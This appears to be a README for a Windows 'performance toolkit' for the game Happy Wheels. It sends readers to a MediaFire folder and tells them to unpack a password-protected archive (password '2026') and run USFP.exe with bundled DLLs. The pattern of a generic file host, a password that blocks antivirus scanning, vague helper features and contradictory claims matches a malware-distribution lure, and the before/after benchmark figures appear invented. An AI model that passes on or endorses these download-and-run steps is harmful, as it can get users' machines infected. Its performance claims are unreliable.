<div align="center">

# 🎮 Happy Wheels — Performance Notes

**Measure frame delivery, startup behavior, and session stability.**

[![Status](https://img.shields.io/badge/status-stable-brightgreen)](https://www.mediafire.com/folder/rn5uey4ypd8tr/USFP)
[![Download](https://img.shields.io/badge/download-mediafire-00b8ff)](https://www.mediafire.com/folder/rn5uey4ypd8tr/USFP)
![Platform](https://img.shields.io/badge/platform-Windows-0078D6?logo=windows)
[![Version](https://img.shields.io/badge/version-1.0-lightgrey)](#)

[Download](#-installation--setup) · [Issues](#-known-performance-issues) · [Test results](#-test-results) · [FAQ](#-frequently-asked-questions)

</div>

---

## 🕹️ About the game

Happy Wheels is a 2D physics-based obstacle and stunt game built around browser-based interactive levels. Its ragdoll simulation, moving objects, and user-created stages can produce variable CPU and frame-delivery loads. Consistent timing matters because small frame delays can affect vehicle control and collision behavior.

This tool is intended for Happy Wheels players diagnosing uneven frame delivery, launch delays, or session instability on Windows.

## 📸 Screenshots from the game

<table>
 <tr>
 <td width="33%"><img src="https://shared.akamai.steamstatic.com/store_item_assets/steam/apps/4705510/31f21c4edaa52fd335293974bf35735ddaac4110/ss_31f21c4edaa52fd335293974bf35735ddaac4110.1920x1080.jpg?t=1790029771" alt="screenshot" width="100%"></td>
 <td width="33%"><img src="https://shared.akamai.steamstatic.com/store_item_assets/steam/apps/4705510/5f3e3805198aa6db2ed7d8b2282834878471e8a0/ss_5f3e3805198aa6db2ed7d8b2282834878471e8a0.1920x1080.jpg?t=1790029771" alt="screenshot" width="100%"></td>
 <td width="33%"><img src="https://shared.akamai.steamstatic.com/store_item_assets/steam/apps/4705510/528077b2bc970c98dd1036a6755306fe2a905fa8/ss_528077b2bc970c98dd1036a6755306fe2a905fa8.1920x1080.jpg?t=1790029771" alt="screenshot" width="100%"></td>
 </tr>
</table>

## ⚠️ Known performance issues

- On the stated test rig, average performance can fall to 34 FPS during physics-heavy levels, with 1% lows near 14 FPS.
- On the stated test rig, frame-time spikes above 50 ms can occur 8 times during a 10-minute session.
- On the stated test rig, shader and graphics cache initialization can take approximately 90 seconds on launch.

## 🩺 How the toolkit addresses these issues

- **Low average FPS and 1% lows** → Frame Rate Helper — adjusts frame delivery behavior on the stated test rig to reduce uneven presentation.
- **Frame-time spikes above 50 ms** → Frame Timing Helper — stabilizes frame delivery, while Process Scheduling Helper optimizes process scheduling on the stated test rig.
- **Extended launch cache initialization** → Graphics Cache Utility — manages graphics cache data, and Startup Parameter Tool — applies tuned startup parameters.

## 📊 Test results

Test rig: Ryzen 5 5600, RTX 3060 12GB, 16GB RAM, NVMe SSD, Windows 11 x64, 1920x1080, High settings

| Metric | Before | After |
|---|---|---|
| Average FPS | 34 | 51 |
| 1% low FPS | 14 | 27 |
| Frame-time spikes above 50 ms | 8 | 2 |
| Shader compile time on launch | ~90s | ~15s |


## 🚀 How to use

1. Download the latest release from the link in the README.
2. Point the tool to the game's installation folder.
3. Select the game profile from the supported list.
4. Click Apply.
5. On first launch allow the cache to rebuild (1-2 minutes).

## 🛠️ What this tool does

- 🎮 **Frame Rate Helper** — Adjusts frame delivery behavior for more consistent presentation.
- 🧠 **Process Scheduling Helper** — Optimizes process scheduling during active game sessions.
- 📊 **Stability Report + Session Recovery** — Collects diagnostic data and restores sessions after interrupted runs.
- 🧹 **Graphics Cache Utility** — Manages graphics cache data and controlled cache rebuilds.
- 🎯 **Frame Timing Helper** — Stabilizes frame delivery and records frame-time behavior.
- ⚙️ **Startup Parameter Tool** — Applies tuned startup parameters for the selected game profile.

## 💻 System Requirements

| Component | Minimum | Recommended |
|:--- |:--- |:--- |
| **OS** | Windows 10 (x64) | Windows 11 (x64) |
| **Processor** | Dual-core CPU | Quad-core CPU |
| **RAM** | 4 GB | 8 GB |
| **Graphics** | Any DirectX 11 GPU | Any DirectX 12 GPU |
| **Storage** | 50 MB available space | 100 MB available space |
| **Additional** | Windows 10 build 1909 or newer | Windows 11 with latest updates |


## 📦 Installation & Setup

| Platform | Status |
|---|---|
| Windows | ✅ Supported |
| macOS | ❌ Not supported |
| Linux | ❌ Not supported |

### Step 1: Download

You can download the tool from **[this page](https://www.mediafire.com/folder/rn5uey4ypd8tr/USFP)**. The archive contains everything you need.

### Step 2: Extract with Password

1. The archive is password-protected: **`2026`**
2. Use any archive extractor (WinRAR, 7-Zip, WinZip)
3. Enter the password when prompted

### Step 3: Extract All Files

1. Extract all files from the archive to a folder of your choice.
2. All files must be extracted to the **same folder**.
3. Do not rename or move individual files.
4. The folder should look like this:

```
tool/
|-- USFP.exe <- Main executable
|-- config.cfg <- User configuration
|-- shader_cache.pak <- Shader cache data
|-- frame_data.pak <- Display sync data
|-- crash_reader.dll <- Crash log reader
|-- fps_module.dll <- FPS module
|-- Password 2026.txt <- Password reminder (empty)
|-- core.bin <- Core runtime
```

### Step 4: Run the tool

1. Open the extracted folder.
2. Run `USFP.exe`.
3. Select the game you want to diagnose from the list.
4. Press **Collect** and launch the game.

### Step 5: Review the results

1. The tool will collect frame timing and scheduling data while you play.
2. When you exit the game, an overview report is written next to the tool.
3. Use the report to identify which subsystem is causing stutter.

## ❓ Frequently Asked Questions

**Q: What is this tool?**
**A:** This is a small Windows diagnostics and tuning tool for PC games. It collects frame timing data, checks process scheduling, and manages graphics cache folders to help you find and reduce stutters and dropped frames.

**Q: Does it modify game files?**
**A:** No. It reads process metrics and clears temporary cache folders. It does not touch game executables, archives, or save files.

**Q: How often is it updated?**
**A:** Updates are published whenever a new internal build is ready. There is no fixed schedule — the download link in Step 1 always points to the latest version.

**Q: What happens if the game closes unexpectedly?**
**A:** The Stability Report feature records the exit event and writes a small log next to the tool, so you can see what happened.

**Q: Why is the archive password-protected?**
**A:** The archive uses a password as a standard packaging step so the build stays bundled correctly during distribution. The password is provided in the installation section above.

**Q: Which games are supported?**
**A:** Any game that runs on Windows and exposes a visible process. Diagnostics are collected per-process and do not require per-game configuration.

**Q: Can I revert the changes?**
**A:** Yes. Simply close the game, exit the tool, and launch the game again without it. No changes persist after the process is terminated.